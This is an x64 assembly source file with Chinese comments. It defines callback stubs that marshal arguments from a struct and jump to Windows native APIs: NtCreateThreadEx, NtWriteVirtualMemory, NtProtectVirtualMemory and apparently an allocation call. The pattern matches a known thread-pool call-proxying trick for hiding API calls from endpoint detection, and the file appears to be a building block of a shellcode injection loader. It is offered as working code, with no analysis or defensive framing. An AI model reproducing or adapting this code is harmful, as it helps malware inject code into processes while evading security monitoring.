.code

WorkCallback proc
    mov rbx, rdx                ; rdx 就是结构体地址， 带有系统api所有参数和api地址的结构体 
    mov rax, [rbx]              ; 结构体第1个成员， api地址
    mov rcx, [rbx + 8h]        ; 结构体第2个成员， api的第1个参数 RCX
    mov rdx, [rbx + 10h]       ; 结构体第3个成员， api的第2个参数 RDX
    xor r8, r8                  ; api第3个参数， R8
    mov r9, [rbx + 18h]        ; 结构体第4个成员，api第4个参数， R9
    mov r10, [rbx + 20h]       ; 结构体第5个， api第6个参数， 栈上面先用R10 存一下
    mov [rsp+30h], r10         ; 吧R10 里面的api第6个参数放到栈上
    mov r10, 3000h             ; api第5个参数
    mov [rsp+28h], r10         ; 放到栈上
    jmp rax						;这样就构建好了一个完整的栈环境，只需要跳到api地址去执行函数就可以了

WorkCallback endp


WorkCallCreateThread proc
    mov rax, [rsp]
    push rax                    ;;保存原来的栈顶
    sub rsp, 58h   ;抬栈
    mov rbx, rdx                ; 结构体首地址
    mov rax, [rbx]              ; NtCreateThreadEx地址
    mov rcx, [rbx + 8h]        ; PHANDLE ThreadHandle
    mov rdx, [rbx + 10h]       ; 0x1FFFFF
    xor r8, r8                  ; NULL
    mov r9, [rbx + 18h]        ; ProcessHandle
    mov r10, [rbx + 20h]       
    mov [rsp+20h], r10          ; startAddress
    mov [rsp+28h], r8           ;参数6
    mov [rsp+30h], r8           ;参数7
    mov [rsp+38h], r8           ;参数8
    mov [rsp+40h], r8           ;参数9
    mov [rsp+48h], r8           ;参数10
    mov [rsp+50h], r8           ;参数11
    call rax
    add rsp, 58h
    pop rax
    mov [rsp], rax
    ret 

WorkCallCreateThread endp



WorkCallNtWriteVirtualMemory proc
    mov rbx, rdx                ; rdx 就是结构体地址， 带有系统api所有参数和api地址的结构体 
    mov rax, [rbx]              ; 结构体第1个成员， api地址
    mov rcx, [rbx + 8h]        ; 结构体第2个成员， api的第1个参数 RCX
    mov rdx, [rbx + 10h]       ; 结构体第3个成员， api的第2个参数 RDX
    mov r8, [rbx + 18h]         ; 结构体第4个成员， R8
    mov r9, [rbx + 20h]        ; 结构体第5个成员，api第4个参数， R9
    mov r10, [rbx + 28h]        ; 结构体第6个成员,api第5个参数
    mov [rsp+28h], r10         ; 放到栈上
    jmp rax						;这样就构建好了一个完整的栈环境，只需要跳到api地址去执行函数就可以了

WorkCallNtWriteVirtualMemory endp


WorkCallNtProtectVirtualMemory proc
    xor rbx, rbx
    mov rbx, rdx                ; rdx 就是结构体地址， 带有系统api所有参数和api地址的结构体 
    mov rax, [rbx]              ; 结构体第1个成员， api地址
    mov rcx, [rbx + 8h]        ; 结构体第2个成员， api的第1个参数 RCX
    mov rdx, [rbx + 10h]       ; 结构体第3个成员， api的第2个参数 RDX
    mov r8, [rbx + 18h]         ; 结构体第4个成员， R8
    mov r9, [rbx + 20h]        ; 结构体第5个成员，api第4个参数， R9
    mov r10, [rbx + 28h]        ; 结构体第6个成员,api第5个参数
    mov [rsp+28h], r10         ; 放到栈上
    jmp rax						;这样就构建好了一个完整的栈环境，只需要跳到api地址去执行函数就可以了
WorkCallNtProtectVirtualMemory endp

end